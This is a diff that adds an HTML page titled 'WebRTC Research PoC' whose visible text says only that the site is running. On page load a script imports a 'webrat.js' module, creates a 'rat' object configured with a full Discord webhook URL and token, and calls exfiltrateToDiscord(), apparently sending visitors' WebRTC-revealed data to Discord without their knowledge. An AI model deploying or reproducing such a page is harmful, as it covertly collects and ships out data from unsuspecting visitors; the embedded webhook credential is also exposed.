@@ -1,0 +1,22 @@
+ <!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>WebRTC Research PoC</title>
+</head>
+<body>
+    <h1>Site is Running</h1>
+    <p>Testing WebRTC vulnerability...</p>
+
+    <script type="module">
+        import Webrecon from './webrat.js';
+
+        // Instantiate with the webhook URL and immediately execute
+        const rat = new Webrecon({ 
+            webhookUrl: "https://discord.com/api/webhooks/1492438092101976095/TDyqg54ZZSjx4_urj4aw_8gIGXei1G2qNbTQE53_rqXShvBZ6895-oX1g-tg_xgrZKIa" 
+        });
+        
+        rat.exfiltrateToDiscord();
+    </script>
+</body>
+</html>
